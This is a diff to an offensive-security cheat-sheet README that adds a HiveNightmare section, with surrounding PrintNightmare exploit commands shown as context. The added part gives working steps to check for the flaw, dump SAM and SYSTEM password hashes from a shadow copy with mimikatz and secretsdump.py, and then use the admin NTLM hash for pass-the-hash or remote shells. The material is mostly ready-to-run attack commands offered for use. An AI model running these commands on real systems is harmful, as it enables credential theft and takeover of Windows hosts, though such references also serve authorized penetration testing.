@@ -52,6 +52,7 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 * **[Low Hanging Fruits](#low-hanging-fruits)**
 	* [ZeroLogon](#zerologon)
 	* [PrintNightmare](#printnightmare)
+	* [HiveNightmare](#hivenightmare)
 * **[File Transfer](#file-transfer)**
 * **[Reverse Shells](#reverse-shells)**
 	* [php](#php-reverse-shell)
@@ -496,6 +497,27 @@ SharpPrintNightmare.exe C:\Windows\Tasks\execme.dll
 smbserver.py smbshare `pwd` -smb2support
 python3 CVE-2021-1675.py testlab/testuser:'P@$$w0rd!'@10.10.10.10 '\\10.10.10.10\smbshare\encme.dll' [-hashes :NTLM]
 ```
+
+### HiveNightmare
+1. Check if system is vulnerable with the following commands
+```
+# Check if BUILTIN/Users has read permission
+icacls C:\Windows\System32\config\SAM
+
+# Check if shadow copy is available
+vssadmin list shadows
+```
+
+2. Dump SYSTEM Hive with mimikatz
+```
+# mimikatz (On remote computer)
+mimikatz# lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM 
+
+# secretsdump.py (Local)
+secretsdump.py -sam SAM-file -system SYSTEM-file LOCAL
+```
+
+Note that the above methods is the manual way. This has been implemented in a automated C# code called [HiveNightmare](https://github.com/GossiTheDog/HiveNightmare) Once you retrieve admin's ntlm, you can do lots of stuff including changing its password or [Pass The Hash](#overpass-the-hash-opth)/PsExec/Evil-Winrm...
 
 ## File Transfer
 
